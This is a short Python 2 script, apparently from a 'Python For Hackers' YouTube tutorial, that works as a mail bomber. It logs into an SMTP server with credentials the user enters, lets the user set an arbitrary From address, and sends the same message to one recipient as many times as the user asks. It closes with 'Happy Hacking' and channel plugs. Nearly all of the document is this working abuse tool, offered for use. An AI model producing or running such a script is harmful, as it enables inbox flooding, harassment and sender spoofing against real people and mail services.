#www.youtube.com/priyankgada
#mail bomber - Python For Hackers - Priyank Gada

import smtplib  #for SMTP Protocol 
import mimetypes #converts URL
import sys #for System
import time #time
from email.MIMEText import MIMEText
class SMTP(object):
      def title(self):
            print "       PYTHON MAIL BOMBER IS WORKING :) "
 
      def SMTPconnect(self):
            print "We are in the SMTPconnect" #list of SMTP server - http://www.e-eeasy.com/SMTPServerList.aspx
            self.smtpserver=raw_input("\nEnter SMTP server: ")
            self.smtpport=input("Enter SMTP port (Usualy 25 or 465): ")
            try:
                  self.mailServer = smtplib.SMTP(self.smtpserver,self.smtpport)
            except IOError, e:
                  print 'Error: %s' %(e)
                  time.sleep(5)
                  sys.exit(1)
            self.mailServer.starttls()
            self.username=raw_input("\nEnter Username: ") #Username
            self.password=raw_input("Enter Password: ") #password
            try:
                  self.mailServer.login(self.username,self.password)
            except BaseException, e:
                  print 'Error: %s' % (e)
                  time.sleep(3)
                  sys.exit(1)
      def buildemail(self):
            print " We are inside Buildemail "
            print "\tBuilding message part"
            self.From = raw_input("\nFrom: ") # From
            self.To = raw_input("\nTo: ") # TO
            self.Subject = raw_input("\nSubject: ") #Subject
            self.Message = raw_input("\nMessage: ") #message
            mensaje = MIMEText(self.Message)
            mensaje['From']=self.From
            mensaje['To']=self.To
            mensaje['Subject']=self.Subject
            self.ammount = input("How Many times would you like to send email: ")
            x = 0
            while x < self.ammount:
                  self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
                  x+=1
            print "Send %d messages to %s" %(self.ammount,self.To)
            time.sleep(7)
            print "Thnx for using Mycode!\nhttp://facebook.com/webmaster.pg\n"
            print " Subscribe :) www.youtube.com/priyankgada "
if __name__ == '__main__':
      s = SMTP()
      s.title()
      s.SMTPconnect()
      s.buildemail()
# End :) Happy Hacking :) subscribe - Youtube.com/priyankgada :)
